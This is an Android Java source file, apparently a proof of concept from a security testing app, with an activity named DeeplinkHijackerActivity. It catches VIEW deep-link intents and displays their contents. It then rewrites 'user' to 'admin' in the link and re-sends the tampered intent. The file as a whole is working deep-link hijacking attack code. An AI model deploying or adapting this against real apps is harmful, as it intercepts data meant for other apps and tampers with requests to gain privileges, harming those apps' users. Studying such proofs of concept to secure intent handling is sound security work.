package com.ookami.evilintent;

import android.app.PendingIntent;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class DeeplinkHijackerActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_deeplink_hijacker);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        Intent received = getIntent();
        assert  received != null;

        Utils.showDialog(this,received);

        if (received.getAction() != null && received.getAction().equals("android.intent.action.VIEW")) {
            Uri uriData = received.getData();
            String uri = uriData != null ? uriData.toString() : "";
            String newUri = uri.replaceAll("user","admin");

            Intent payload = new Intent("android.intent.action.VIEW");
            payload.setData(Uri.parse(newUri));
            startActivity(payload);
        }
    }
}